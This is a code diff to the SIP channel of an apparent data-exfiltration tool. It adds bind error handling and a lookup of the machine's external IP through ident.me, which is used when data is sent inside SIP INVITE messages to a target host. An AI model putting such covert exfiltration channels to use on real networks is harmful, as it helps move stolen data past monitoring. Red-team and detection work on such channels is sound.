@@ -10,6 +10,7 @@ import base64
 import re
 from random import choice
 import traceback
+import requests
 
 config = None
 app_exfiltrate = None
@@ -183,7 +184,12 @@ def listen():
     app_exfiltrate.log_message('info', "[sip] Listening for incoming calls")
     port = config['port']
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind(('0.0.0.0', port))
+    try:
+        sock.bind(('0.0.0.0', port))
+    except PermissionError:
+        app_exfiltrate.log_message('warning', f"[sip] cannot bind on port {port}: PermissionError")
+        sys.exit()
+
     while True:
         data, addr = sock.recvfrom(65535)
         try:
@@ -210,7 +216,15 @@ def listen():
         except Exception as e:
             print(traceback.format_exc())
             print('exception: ' + repr(e))
-            pass
+            
+def get_external_ip():
+    r = requests.get("http://v4.ident.me")
+    if r.ok:
+        return r.text
+    else:
+        app_exfiltrate.log_message('warning', "Cannot get external IP address, exiting")
+        sys.exit()
+
 
 def send(data):
     if 'proxies' in config and config['proxies'] != [""]:
@@ -221,9 +235,13 @@ def send(data):
     txport = config['txport']
     port = config['port']
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind(('0.0.0.0', txport))
+    try:
+        sock.bind(('0.0.0.0', txport))
+    except PermissionError:
+        app_exfiltrate.log_message('warning', f"[sip] cannot bind on port {txport}: PermissionError")
+        sys.exit()
     dialog = SIPDialog()
-    laddr = socket.gethostbyname(socket.getfqdn())
+    laddr = get_external_ip()
     uac = UserAgent(caller, laddr, port=txport)
     uas = UserAgent(callee, target, port=port)
     invite = dialog.invite(uac, uas, data)
@@ -251,7 +269,11 @@ def proxy():
     port = config['port']
     sender = ""
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind(('0.0.0.0', port))
+    try:
+        sock.bind(('0.0.0.0', port))
+    except PermissionError:
+        app_exfiltrate.log_message('warning', f"[sip] cannot bind on port {port}: PermissionError")
+        sys.exit()
     while True:
         data, addr = sock.recvfrom(65535)
         if addr[0] != target:
